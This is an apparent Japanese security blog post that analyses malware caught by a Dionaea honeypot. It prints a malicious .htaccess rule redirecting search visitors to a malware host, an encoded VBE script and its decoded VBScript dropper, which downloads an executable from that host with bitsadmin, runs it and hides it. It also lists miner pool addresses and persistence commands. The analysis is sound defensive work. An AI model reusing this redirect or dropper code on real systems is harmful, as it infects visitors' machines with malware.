
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>.htaccessで悪質なサイトへ誘導する手法 | csirt.mrtc0.log</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Dionaeaにて.htaccessを使ってマルウェア配布サイトへ誘導する手法を観測しました.  
RewriteEngine on RewriteCond %&amp;#123;HTTP_REFERER&amp;#125; ^(.*)google\.(.*) RewriteRule .* http://testswork.ru/info.zip [L]
Google検索経由でアクセスした場合, hxxp://t">
<meta property="og:type" content="article">
<meta property="og:title" content=".htaccessで悪質なサイトへ誘導する手法">
<meta property="og:url" content="https://csirt.mrtc0.com/2016/01/21/cilickxfo0000i2cm6oyj21rd/index.html">
<meta property="og:site_name" content="csirt.mrtc0.log">
<meta property="og:description" content="Dionaeaにて.htaccessを使ってマルウェア配布サイトへ誘導する手法を観測しました.  
RewriteEngine on RewriteCond %&amp;#123;HTTP_REFERER&amp;#125; ^(.*)google\.(.*) RewriteRule .* http://testswork.ru/info.zip [L]
Google検索経由でアクセスした場合, hxxp://t">
<meta property="og:updated_time" content="2016-01-21T16:48:38.400Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content=".htaccessで悪質なサイトへ誘導する手法">
<meta name="twitter:description" content="Dionaeaにて.htaccessを使ってマルウェア配布サイトへ誘導する手法を観測しました.  
RewriteEngine on RewriteCond %&amp;#123;HTTP_REFERER&amp;#125; ^(.*)google\.(.*) RewriteRule .* http://testswork.ru/info.zip [L]
Google検索経由でアクセスした場合, hxxp://t">
<meta name="twitter:creator" content="@mrtc0">
  
    <link rel="alternative" href="/atom.xml" title="csirt.mrtc0.log" type="application/atom+xml">
  
  
  <link rel="stylesheet" href="/css/style.css" type="text/css">
  <link href="//fonts.useso.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
</head>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">csirt.mrtc0.log</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">tail -f csirt.log</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="csirt.mrtc0.com">
        </form>
      </div>
    </div>
  </div>
</header>
    <div class="outer">
      <section id="main"><article id="post-htaccessで悪質なサイトへ誘導する手法" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/01/21/cilickxfo0000i2cm6oyj21rd/" class="article-date">
  <time datetime="2016-01-21T14:45:06.000Z" itemprop="datePublished">2016-01-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      .htaccessで悪質なサイトへ誘導する手法
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Dionaeaにて.htaccessを使ってマルウェア配布サイトへ誘導する手法を観測しました.  </p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="keyword"><span class="common">RewriteEngine</span></span> <span class="literal">on</span> </span><br><span class="line"><span class="keyword"><span class="common">RewriteCond</span></span> <span class="cbracket">%&#123;HTTP_REFERER&#125;</span> ^(.*)google\.(.*) </span><br><span class="line"><span class="keyword"><span class="common">RewriteRule</span></span> .* http://testswork.ru/info.zip<span class="sqbracket"> [L]</span></span><br></pre></td></tr></table></figure>
<p>Google検索経由でアクセスした場合, hxxp://testwork.ru/info.zip へとアクセスさせています.  </p>
<h4 id="testwork-ru"><a href="#testwork-ru" class="headerlink" title="testwork.ru"></a>testwork.ru</h4><h6 id="VirusTotal_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C"><a href="#VirusTotal_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C" class="headerlink" title="VirusTotalでのスキャン結果"></a>VirusTotalでのスキャン結果</h6><ul>
<li><a href="https://www.virustotal.com/ja/domain/testswork.ru/information/" target="_blank" rel="external">https://www.virustotal.com/ja/domain/testswork.ru/information/</a></li>
</ul>
<h6 id="urlQuery_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C"><a href="#urlQuery_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C" class="headerlink" title="urlQueryでのスキャン結果"></a>urlQueryでのスキャン結果</h6><ul>
<li><a href="https://urlquery.net/report.php?id=1453389404756" target="_blank" rel="external">https://urlquery.net/report.php?id=1453389404756</a></li>
</ul>
<h4 id="info-zip"><a href="#info-zip" class="headerlink" title="info.zip"></a>info.zip</h4><table>
<thead>
<tr>
<th style="text-align:center">filename</th>
<th style="text-align:left">SHA256</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">info.zip</td>
<td style="text-align:left">29f2a333e29f56de652bb676323873e92406050c4e222fb9c141b228558a76f1</td>
</tr>
</tbody>
</table>
<h6 id="VirusTotal_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C-1"><a href="#VirusTotal_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C-1" class="headerlink" title="VirusTotalでのスキャン結果"></a>VirusTotalでのスキャン結果</h6><ul>
<li><a href="https://www.virustotal.com/ja/file/29f2a333e29f56de652bb676323873e92406050c4e222fb9c141b228558a76f1/analysis/1453388291/" target="_blank" rel="external">https://www.virustotal.com/ja/file/29f2a333e29f56de652bb676323873e92406050c4e222fb9c141b228558a76f1/analysis/1453388291/</a></li>
</ul>
<p>info.zipの中にはinformation.vbeのみがありました.  </p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">#<span class="variable">@~</span>^rAIAAA==Y~q/<span class="number">4</span>?V^~<span class="string">',Z.+mYn6(L+1O`?1.rwDRUtnVsE*@#@&amp;OPUY.nm:Px~;DnlDn&#125;4mD`Jzf&#125;9Ac?OlhE*@#@&amp;@#@&amp;q6PqdODvFjm.raY s!sVglhnBj^Mk2YcnX+EBF*@*!,K4nx,@#@&amp;Pd4Ut+^sR"Ex,E/?1DbwOPEEr[?1.kaY j1Dk2OwEsVgCs+'</span>rJrJ~Z),?<span class="number">1</span>DrwDR&#125;;bY<span class="variable">@#</span><span class="variable">@&amp;</span><span class="number">3</span>x9Pk6<span class="variable">@#</span><span class="variable">@&amp;</span><span class="variable">@#</span><span class="variable">@&amp;</span>KswxJYPAHK]<span class="string">'O:a  nX+J@#@&amp;`Ds'</span>r4DY2=zJY+kYkAWM3 D!zOha a+r<span class="variable">@#</span><span class="variable">@&amp;</span><span class="variable">@#</span><span class="variable">@&amp;</span><span class="number">3</span>m4W&#123;fG<span class="comment">//Gs:Cx9cJ1:[~JmP8rD/CNsrP&amp;DDmx/6+M~h4lO+7+.~r[jMs[rPJLPhwLJ,['PdOmDOPJ8Pr[Pha[J~',lOYMr(PQ4Pr[KswBfvZ!T!*@#@&amp;31tW&#123;9WkZWshCx9`rmhN~&amp;1Pnm4GD.GMPcT*,@*~cZ*cYaDJBF!Z!Zb@#@&amp;@#@Um.raYR5;kD@#@&amp;@#@&amp;oEmDkGx~9K//WshlNc^K::CU9~dna#@#@&amp;P,?+DPqdtA6nmd4Ut+^sRA6+1c^Ws:mx[#l~q?^Db2Yc?swPd+2),kt3X+1RDsrxmYn`*@#@&amp;~,fWk/Ws:l[ktA6nm jDN6ED l[)^V@#@&amp;3N~0!U1YrKxwcsAAA==^#~@]]`]&#125;])]]']]]]&#125;`'")'</span></span><br></pre></td></tr></table></figure>
<p>このように難読化されていました.<br>この難読化には下記のツールが使用されたと思われます.  </p>
<ul>
<li><a href="https://gallery.technet.microsoft.com/Encode-and-Decode-a-VB-a480d74c" target="_blank" rel="external">https://gallery.technet.microsoft.com/Encode-and-Decode-a-VB-a480d74c</a></li>
</ul>
<p>デコードも可能であるため, 試したところ以下のようなVBスクリプトとなりました.  </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">Set</span> WshShell = CreateObject(<span class="string">"WScript.Shell"</span>)</span><br><span class="line"><span class="keyword">Set</span> Stream = CreateObject(<span class="string">"ADODB.Stream"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> <span class="keyword">Instr</span>(<span class="number">1</span>,WScript.FullName,<span class="string">"WScript.exe"</span>,<span class="number">1</span>)&gt;<span class="number">0</span> <span class="keyword">Then</span> </span><br><span class="line">  WshShell.Run <span class="string">"CScript """</span>&amp;WScript.ScriptFullName&amp;<span class="string">""""</span>,<span class="number">0</span>: WScript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">if</span></span><br><span class="line"></span><br><span class="line">Tmp=<span class="string">"%TEMP%\tmp2.exe"</span></span><br><span class="line"><span class="keyword">Url</span>=<span class="string">"http://testswork.ru/tmp2.exe"</span></span><br><span class="line"></span><br><span class="line">Echo=DosCommand(<span class="string">"cmd /c bitsadmin /transfer whatever "</span>&amp;<span class="keyword">Url</span>&amp;<span class="string">" "</span>&amp;Tmp&amp;<span class="string">" &amp;&amp; start /b "</span>&amp;Tmp&amp;<span class="string">" &amp; attrib +h "</span>&amp;Tmp,<span class="number">360000</span>)</span><br><span class="line">Echo=DosCommand(<span class="string">"cmd /c echo error 404 &gt; 404.txt"</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">WScript.Quit</span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> DosCommand(command,<span class="keyword">sleep</span>)</span><br><span class="line">  <span class="keyword">Set</span> WshExec=WshShell.Exec(command): WScript.<span class="keyword">Sleep</span> <span class="keyword">sleep</span>: WshExec.Terminate()</span><br><span class="line">  DosCommand=WshExec.StdOut.ReadAll</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">function</span></span></span><br></pre></td></tr></table></figure>
<p>%TEMP%にtmp2.exeをダウンロードして実行する, いわゆるドロッパーですね.<br>attrib +h でファイルを隠したりもしてます.  </p>
<h6 id="malwr-com_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C"><a href="#malwr-com_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C" class="headerlink" title="malwr.comでのスキャン結果"></a>malwr.comでのスキャン結果</h6><ul>
<li><a href="https://malwr.com/analysis/NTQ1ZGQ5OGY2Mjk3NGMwZThjNjExMThlZmRlZTFlZTY/" target="_blank" rel="external">https://malwr.com/analysis/NTQ1ZGQ5OGY2Mjk3NGMwZThjNjExMThlZmRlZTFlZTY/</a></li>
</ul>
<h6 id="hybrid-analysis_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C"><a href="#hybrid-analysis_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C" class="headerlink" title="hybrid-analysisでのスキャン結果"></a>hybrid-analysisでのスキャン結果</h6><ul>
<li><a href="https://www.hybrid-analysis.com/sample/26337534fb67553e07eb6568cd272153120d6b2b565148392e8a13287f367a5e?environmentId=1" target="_blank" rel="external">https://www.hybrid-analysis.com/sample/26337534fb67553e07eb6568cd272153120d6b2b565148392e8a13287f367a5e?environmentId=1</a></li>
</ul>
<h4 id="tmp2-exe"><a href="#tmp2-exe" class="headerlink" title="tmp2.exe"></a>tmp2.exe</h4><p>すでにtmp2.exeはダウンロードできなくなっていましたが, オンラインスキャナに上がっていました.  </p>
<p>FTPサーバーを立てたりIMG001.exeをダウンロードしてます.<br>ダウンロードしたIMG001.exeは HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run などのレジストリや schtasks /create /tn “UAC” /SC ONLOGON /F /RL HIGHEST /TR のようなコマンドでスケジューラに登録して自動起動するようにされます.<br>また, powercfg.exeで電源設定などを変更するようです.  </p>
<h6 id="hybrid-analysis_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C-1"><a href="#hybrid-analysis_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C-1" class="headerlink" title="hybrid-analysisでのスキャン結果"></a>hybrid-analysisでのスキャン結果</h6><ul>
<li><a href="https://www.hybrid-analysis.com/sample/5616b94f1a40b49096e2f8f78d646891b45c649473a5b67b8beddac46ad398e1?environmentId=1" target="_blank" rel="external">https://www.hybrid-analysis.com/sample/5616b94f1a40b49096e2f8f78d646891b45c649473a5b67b8beddac46ad398e1?environmentId=1</a></li>
</ul>
<h4 id="IMG001-exe"><a href="#IMG001-exe" class="headerlink" title="IMG001.exe"></a>IMG001.exe</h4><p>Bitcoin Minerだったり, Trojanだったりいくつかあるようです.<br><a href="https://www.hybrid-analysis.com/search?query=IMG001.exe" target="_blank" rel="external">https://www.hybrid-analysis.com/search?query=IMG001.exe</a>  </p>
<p>pools.txtというテキストファイルにはBitcoinのプールのアドレスが記述されていました.  </p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//mine.moneropool.com:8080</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//mine.moneropool.com:3336</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//xmr.hashinvest.net:443</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//xmr.hashinvest.net:5555</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//monero.crypto-pool.fr:3333</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//monerohash.com:5555</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//mine.xmr.unipool.pro:3333</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//xmr.prohash.net:5555</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//xmr.miner.center:2777</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//mine.xmr.unipool.pro:80</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//pool.minexmr.com:7777</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//cryptonotepool.org.uk:7777</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//mro.poolto.be:3000</span></span><br></pre></td></tr></table></figure>
<p>これらのファイルは「Nullsoft Installer」で作成されており, 展開することができます.  </p>
<h4 id="u53C2_u8003"><a href="#u53C2_u8003" class="headerlink" title="参考"></a>参考</h4><ul>
<li><a href="http://csirt.ninja/?p=280" target="_blank" rel="external">ハニーポットにFTP経由で設置されたファイル調査メモ (2016/01/20) - (n)inja csirt</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://csirt.mrtc0.com/2016/01/21/cilickxfo0000i2cm6oyj21rd/" data-id="cilickxfo0000i2cm6oyj21rd" class="article-share-link">Share</a>
      

      
        <a href="https://csirt.mrtc0.com/2016/01/21/cilickxfo0000i2cm6oyj21rd/#disqus_thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dionaea/">dionaea</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/honeypot/">honeypot</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2016/03/05/cilickxg90005i2cmfnatlivy/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          2015年のハニーポット記録(セキュリティ・キャンプ アワード2016)
        
      </div>
    </a>
  
  
</nav>

  
</article>


  <section id="comments">
    <div id="disqus_thread">
      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    </div>
  </section>
</section>
      
      <aside id="sidebar">
  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cowrie/">cowrie</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dionaea/">dionaea</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glastopf/">glastopf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/honeypot/">honeypot</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nosqlpot/">nosqlpot</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/cowrie/" style="font-size: 10px;">cowrie</a> <a href="/tags/dionaea/" style="font-size: 15px;">dionaea</a> <a href="/tags/glastopf/" style="font-size: 10px;">glastopf</a> <a href="/tags/honeypot/" style="font-size: 20px;">honeypot</a> <a href="/tags/nosqlpot/" style="font-size: 10px;">nosqlpot</a> <a href="/tags/redis/" style="font-size: 10px;">redis</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a><span class="archive-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2016/03/07/cilickxge000ci2cme9cxvqyk/">Redisで任意のファイルをアップロードする攻撃</a>
          </li>
        
          <li>
            <a href="/2016/03/05/cilickxg90005i2cmfnatlivy/">2015年のハニーポット記録(セキュリティ・キャンプ アワード2016)</a>
          </li>
        
          <li>
            <a href="/2016/01/21/cilickxfo0000i2cm6oyj21rd/">.htaccessで悪質なサイトへ誘導する手法</a>
          </li>
        
      </ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Links</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="http://mrtc0.hateblo.jp/" target="_blank">mrtc0.log</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
      
    </div>
    <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2016 mrtc0<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
    </div>
  </div>
</footer>
  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
  <!-- totop start -->
<div id="totop">
<a title="totop"><img src="/img/scrollup.png"/></a>
</div>

<!-- totop end -->

<script>
  var disqus_shortname = 'mrtc0';
  
  var disqus_url = 'https://csirt.mrtc0.com/2016/01/21/cilickxfo0000i2cm6oyj21rd/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>




<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/script.js" type="text/javascript"></script>

</div>
</body>
</html>
